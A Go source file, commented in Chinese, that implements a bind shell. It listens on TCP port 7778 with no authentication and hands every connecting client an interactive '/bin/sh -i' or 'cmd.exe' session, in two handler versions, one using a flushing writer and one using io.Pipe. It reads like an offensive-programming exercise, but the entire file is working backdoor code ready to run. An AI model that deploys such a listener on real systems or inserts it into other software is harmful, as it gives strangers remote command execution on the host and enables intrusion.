package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
	"runtime"
)

type Flusher struct {
	w *bufio.Writer
}

func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

// 写入数据并显式刷新缓冲区
func (flusher *Flusher) Write(b []byte) (int, error) {
	count, err := flusher.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := flusher.w.Flush(); err != nil {
		return -1, err
	}

	return count, err
}

// 命令执行 不够优雅 见 handle_plus
func handle(conn net.Conn) {
	// 显式调用/bin/sh 并使用-i进入交互模式
	// 这样我们就可以把它作为标准输入输出
	// 对于windows 使用exec.Command("cmd.exe")

	// 判断系统类型
	systemType := runtime.GOOS
	var cmd *exec.Cmd
	if systemType == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}
	// 将标准输入设置为我们的连接
	cmd.Stdin = conn
	// 从连接创建一个Flusher用于标准输出
	// 这样可以保证输出被充分刷新并通过net.Conn发送
	cmd.Stdout = NewFlusher(conn)

	// 运行命令
	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}

}

// 优雅的handle
func handle_plus(conn net.Conn) {
	systemType := runtime.GOOS
	var cmd *exec.Cmd
	if systemType == "windows" {
		cmd = exec.Command("cmd.exe")
	} else {
		cmd = exec.Command("/bin/sh", "-i")
	}

	// 通过使用Pipe 可以避免显式刷新writer并同步连接stdout和TCP连接
	rp, wp := io.Pipe()
	cmd.Stdin = conn
	cmd.Stdout = wp
	go io.Copy(conn, rp)
	cmd.Run()
	conn.Close()
}

func main() {
	// 监听
	listener, _ := net.Listen("tcp", ":7778")
	for {
		conn, _ := listener.Accept()
		// 不够优雅
		// go handle(conn)
		go handle_plus(conn)
	}

}
